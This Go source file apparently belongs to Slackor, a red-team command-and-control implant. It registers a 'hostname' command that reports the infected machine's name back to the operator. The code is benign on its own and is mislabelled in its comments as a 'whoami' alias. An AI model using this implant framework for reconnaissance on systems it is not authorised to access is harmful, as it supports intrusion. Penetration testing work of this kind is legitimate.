package common

import (
	"os"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Hostname is an alias for whoami
type Hostname struct{}

// Name is the name of the command
func (h Hostname) Name() string {
	return "hostname"
}

// Run is an alias for whoami
func (h Hostname) Run(clientID string, jobID string, args []string) (string, error) {
	name, err := os.Hostname()
	if err != nil {
		return "", err
	}
	return name, nil
}

func init() {
	command.RegisterCommand(Hostname{})
}
